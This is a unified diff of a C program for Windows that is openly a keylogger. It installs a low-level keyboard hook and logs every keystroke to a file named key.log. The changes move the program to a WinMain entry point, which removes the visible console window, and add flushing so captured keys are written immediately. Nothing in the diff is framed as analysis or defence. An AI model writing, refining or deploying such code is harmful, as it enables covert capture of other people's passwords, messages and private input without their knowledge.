@@ -1,7 +1,8 @@
 #include <stdio.h>
-#include <Windows.h>
+#include <windows.h>
 #include <winuser.h>
 #include <stdbool.h>
+#include <winbase.h>
 
 HHOOK hookHandle;
 FILE* fp;
@@ -30,6 +31,7 @@ LRESULT CALLBACK keylogger(
 				else {
 					fprintf(fp, "[%ls]", keyText);
 				}
+				fflush(fp);
 			}
 		}
 	}
@@ -37,11 +39,11 @@ LRESULT CALLBACK keylogger(
 	return CallNextHookEx(hookHandle, nCode, wParam, lParam);
 };
 
-void main() {
+int APIENTRY WinMain(HINSTANCE hInst, HINSTANCE hInstPrev, PSTR cmdline, int cmdshow) {
 	errno_t err = fopen_s(&fp, "key.log", "w");
 	if (err != 0) {
 		printf("Error while opening log file %d", err);
-		return;
+		return 1;
 	}
 
 	hookHandle = SetWindowsHookEx(WH_KEYBOARD_LL, &keylogger, NULL, 0);
@@ -54,6 +56,5 @@ void main() {
 			DispatchMessage(&msg);
 		}
 	};
+	return 0;
 }
-// winmain
-// write to a file
